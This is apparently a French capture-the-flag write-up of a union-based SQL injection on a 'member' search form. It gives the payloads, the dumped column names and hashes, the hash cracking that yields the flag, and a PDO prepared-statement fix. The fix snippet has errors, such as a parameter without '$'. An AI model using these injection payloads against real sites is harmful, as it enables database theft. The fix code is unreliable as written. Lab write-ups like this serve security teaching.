
# Explications

Dans la page "member", il y un formulaire pour faire une recherche des membres par id du site :
```html
<form  action="#"  method="GET"  data-children-count="1">
<input  type="hidden"  name="page"  value="member">
<input  type="text"  name="id"  style="width:100%;">
<br>
<input  type="submit"  value="Submit"  name="Submit">
</form>
```
On observe que si on laisse le champs vide et que l'on lance une recherche, on obtient une erreur:

**You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1**

Donc on sait que le site utilise une base de donnée sous MySQL et qu'il ne gere pas les entrées non prevues.
On peut donc effectuer des injections SQL.
Celle qui a fonctionner était une **Union-Based SQL Injection**

## Etapes
On mets une condition vraie dans tous les cas

<code>1 OR 1=1</code>
> Tous les users s'affichent
<pre>
ID: 1 OR 1=1 
First name: Barack Hussein
Surname : Obama

ID: 1 OR 1=1 
First name: Adolf
Surname : Hitler

ID: 1 OR 1=1 
First name: Joseph
Surname : Staline

ID: 1 OR 1=1 
First name: Flag
Surname : GetThe
</pre>

On affiche essaye d'afficher tous les noms de colonnes et de tables présentes sur la base de données a la palce du **First name** et du **Surname**

<code>1 UNION SELECT column_name, table_name FROM information_schema.columns</code>
> Toutes les tables et leurs colonnes s'affichent a la place du **First name** et du **Surname**

On cherche et on trouve un table **users** qui contient les colonnes :
1. user_id
2. first_name
3. last_name
4. town
5. country
6. planet
7. Commentaire
8. countersign

On cherche donc des informations intéressantes.
<code></code>

On try 2 part 2 les champs jusqu'à trouver 2 colonnes intéressante, **Commentaire** et **countersign** qui donnent :

<pre>
ID: 1 UNION SELECT Commentaire, countersign From users 
First name: Barack Hussein
Surname : Obama

ID: 1 UNION SELECT Commentaire, countersign From users 
First name: Amerca !
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9

ID: 1 UNION SELECT Commentaire, countersign From users 
First name: Ich spreche kein Deutsch.
Surname : 60e9032c586fb422e2c16dee6286cf10

ID: 1 UNION SELECT Commentaire, countersign From users 
First name: ????? ????????????? ?????????
Surname : e083b24a01c483437bcf4a9eea7c1b4d

ID: 1 UNION SELECT Commentaire, countersign From users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
</pre>

Le password <code>5ff9d0165b4f92b14994e5c685cdce28</code> est en MD5 donc on applique un MD5 reverse et on obtient :
<pre>FortyTwo</pre>
On lower le tout et on applique un Sha256 pour obtenir le flag

# Comment éviter cela ?
Il suffit d'utiliser le <code>prepare</code> quand on fait des requêtes à la base de données comme dans l'exmple ci-dessous:

```php
<?php
	function name(id) {
		try
		{
			// On se connecte
			$bdd = new PDO('mysql:host=localhost;dbname=name', 'mdp', '', array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION ));
			
			// On prépare la requête
			$requete = $bdd->prepare("SELECT * FROM users WHERE id = :id");

			// On lie la variable $id définie au-dessus au paramètre :id de la requête préparée
			$requete->bindValue(':id', $id, PDO::PARAM_STR);

			//On exécute la requête
			$requete->execute();
			
			// On récupère le résultat
			if ($requete->fetch())
			{
				echo 'INFORMATIONS';
			}
		} catch (Exception $e)
		{
			die('Erreur : ' . $e->getMessage());
		}
	}
?>
```
